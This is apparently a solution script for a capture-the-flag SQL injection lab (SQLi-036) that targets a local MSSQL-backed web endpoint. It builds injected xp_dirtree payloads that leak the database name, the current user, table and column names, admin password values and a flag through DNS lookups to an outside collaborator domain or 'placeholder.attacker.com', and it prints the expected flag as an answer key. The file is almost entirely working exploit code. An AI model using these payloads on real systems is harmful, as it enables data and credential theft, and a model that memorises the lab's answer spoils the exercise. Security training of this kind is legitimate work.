#!/usr/bin/env python3
"""
SQLi-036: MSSQL OOB DNS via xp_dirtree Exploit

Usage:
    python exploit.py --collaborator your-subdomain.burpcollaborator.net
    python exploit.py --interactsh xxx.oast.fun --full
"""

import requests
import argparse
import time

def create_oob_payload(query, oob_domain, var_name="d", var_type="VARCHAR(200)"):
    """Create xp_dirtree OOB payload"""
    payload = f"1;DECLARE @{var_name} {var_type};SET @{var_name}=({query});EXEC('master..xp_dirtree \"\\\\'+@{var_name}+'.{oob_domain}\\a\"')--"
    return payload

def send_payload(url, payload):
    """Send payload to target"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=15)
        return True
    except requests.exceptions.Timeout:
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def extract_database(url, oob_domain):
    """Extract database name"""
    print("\n[*] Extracting database name...")
    payload = create_oob_payload("DB_NAME()", oob_domain)
    send_payload(url, payload)
    print(f"    â†’ Check DNS for: <database>.{oob_domain}")

def extract_user(url, oob_domain):
    """Extract current user"""
    print("\n[*] Extracting current user...")
    payload = create_oob_payload("SYSTEM_USER", oob_domain, "u")
    send_payload(url, payload)
    print(f"    â†’ Check DNS for: <user>.{oob_domain}")

def extract_tables(url, oob_domain, count=6):
    """Extract table names using NOT IN pagination"""
    print(f"\n[*] Extracting tables (first {count})...")
    for i in range(count):
        if i == 0:
            query = "SELECT TOP 1 table_name FROM information_schema.tables"
        else:
            query = f"SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP {i} table_name FROM information_schema.tables)"
        
        payload = create_oob_payload(query, oob_domain, "t")
        send_payload(url, payload)
        print(f"    â†’ Table {i+1}: sent")
        time.sleep(0.5)
    print(f"    â†’ Check DNS for table names")

def extract_columns(url, oob_domain, table_name, count=5):
    """Extract column names from table"""
    print(f"\n[*] Extracting columns from '{table_name}'...")
    for i in range(count):
        if i == 0:
            query = f"SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='{table_name}'"
        else:
            query = f"SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='{table_name}' AND column_name NOT IN (SELECT TOP {i} column_name FROM information_schema.columns WHERE table_name='{table_name}')"
        
        payload = create_oob_payload(query, oob_domain, "c")
        send_payload(url, payload)
        print(f"    â†’ Column {i+1}: sent")
        time.sleep(0.5)
    print(f"    â†’ Check DNS for column names")

def extract_data(url, oob_domain, table, column, count=3):
    """Extract data from table"""
    print(f"\n[*] Extracting data from {table}.{column}...")
    for i in range(count):
        if i == 0:
            query = f"SELECT TOP 1 {column} FROM {table}"
        else:
            query = f"SELECT TOP 1 {column} FROM {table} WHERE {column} NOT IN (SELECT TOP {i} {column} FROM {table})"
        
        payload = create_oob_payload(query, oob_domain, "v")
        send_payload(url, payload)
        print(f"    â†’ Row {i+1}: sent")
        time.sleep(0.5)
    print(f"    â†’ Check DNS for data values")

def extract_flag(url, oob_domain):
    """Extract flag from secrets table"""
    print("\n" + "="*60)
    print("[*] EXTRACTING FLAG...")
    print("="*60)
    
    # Direct extraction by name
    query = "SELECT value FROM secrets WHERE name='sqli_036_flag'"
    payload = create_oob_payload(query, oob_domain, "f")
    send_payload(url, payload)
    print(f"    â†’ Check DNS for: FLAG{{...}}.{oob_domain}")
    
    print("\n" + "="*60)
    print("ðŸŽ‰ Expected flag: FLAG{mssql_xp_dirtree_oob}")
    print("="*60)

def main():
    parser = argparse.ArgumentParser(description="SQLi-036: MSSQL OOB DNS Exploit")
    parser.add_argument("--target", default="http://localhost:5036/employee",
                        help="Target URL (default: http://localhost:5036/employee)")
    parser.add_argument("--collaborator", help="Burp Collaborator domain")
    parser.add_argument("--interactsh", help="interactsh domain")
    parser.add_argument("--full", action="store_true", help="Run full enumeration")
    
    args = parser.parse_args()
    
    # Determine OOB domain
    oob_domain = args.collaborator or args.interactsh
    if not oob_domain:
        print("[!] Please specify --collaborator or --interactsh domain")
        print("[*] Using placeholder domain for demo...")
        oob_domain = "placeholder.attacker.com"
    
    print("="*60)
    print("SQLi-036: MSSQL OOB DNS via xp_dirtree")
    print("="*60)
    print(f"Target: {args.target}")
    print(f"OOB Domain: {oob_domain}")
    print("="*60)
    print("\n[!] Make sure you're monitoring your OOB listener!")
    
    if args.full:
        extract_database(args.target, oob_domain)
        time.sleep(1)
        extract_user(args.target, oob_domain)
        time.sleep(1)
        extract_tables(args.target, oob_domain)
        time.sleep(1)
        extract_columns(args.target, oob_domain, "secrets")
        time.sleep(1)
        extract_data(args.target, oob_domain, "admin_accounts", "password")
    
    extract_flag(args.target, oob_domain)

if __name__ == "__main__":
    main()
